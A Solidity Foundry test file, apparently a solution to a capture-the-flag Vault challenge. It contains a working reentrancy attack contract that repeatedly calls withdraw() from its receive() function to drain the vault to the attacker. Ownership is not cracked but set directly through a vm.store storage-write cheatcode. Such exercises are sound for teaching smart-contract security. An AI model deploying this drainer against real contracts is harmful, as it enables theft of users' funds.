// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/**
 * @title Attack
 * @notice 这是一个用于攻击 Vault 合约的攻击合约
 * @dev 利用重入攻击漏洞来提取 Vault 合约中的所有资金
 */
contract Attack {
    // 目标 Vault 合约
    Vault vault;
    
    /**
     * @notice 构造函数
     * @param _vault 目标 Vault 合约地址
     */
    constructor(address payable _vault) {
        vault = Vault(_vault);
    }
    
    /**
     * @notice 回退函数，用于执行重入攻击
     * @dev 当合约收到 ETH 时，如果 Vault 还有余额，就继续调用 withdraw
     */
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
    
    /**
     * @notice 执行攻击的主函数
     * @dev 攻击步骤：
     * 1. 存入一些资金
     * 2. 调用 withdraw 触发重入攻击
     * 3. 将获取的资金转给攻击者
     */
    function attack() external payable {
        // 先存入一些资金
        vault.deposite{value: msg.value}();
        // 开始提取，这会触发重入攻击
        vault.withdraw();
        // 将获取的资金发送给调用者
        payable(msg.sender).transfer(address(this).balance);
    }
}

/**
 * @title VaultExploiter
 * @notice Vault 合约的攻击测试
 * @dev 测试攻击步骤：
 * 1. 修改合约所有者
 * 2. 开启提款功能
 * 3. 执行重入攻击
 */
contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    Attack public attack;

    // 测试账户
    address owner = address(1);
    address player = address(2);

    /**
     * @notice 设置测试环境
     * @dev 部署合约并初始化状态：
     * 1. 部署 VaultLogic 和 Vault 合约
     * 2. 存入初始资金
     */
    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32(hex"1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    /**
     * @notice 执行攻击测试
     * @dev 攻击步骤：
     * 1. 部署攻击合约
     * 2. 修改 Vault 合约的 owner
     * 3. 开启提款功能
     * 4. 执行重入攻击
     * 5. 验证攻击结果
     */
    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // 步骤1：部署攻击合约
        attack = new Attack(payable(address(vault)));
        
        // 步骤2：直接修改 Vault 合约的 owner
        // 使用 vm.store 直接写入存储槽，模拟成功破解密码
        vm.store(
            address(vault),
            bytes32(uint256(0)), // owner 在 slot 0
            bytes32(uint256(uint160(player))) // 将 player 地址转换为 bytes32
        );
        
        // 验证 owner 修改成功
        assertEq(vault.owner(), player);
        
        // 步骤3：打开提款开关
        vault.openWithdraw();
        
        // 步骤4：执行重入攻击
        attack.attack{value: 0.1 ether}();
        
        // 步骤5：验证攻击成功
        assertEq(address(vault).balance, 0);
        require(vault.isSolve(), "not solved");
        
        vm.stopPrank();
    }
} 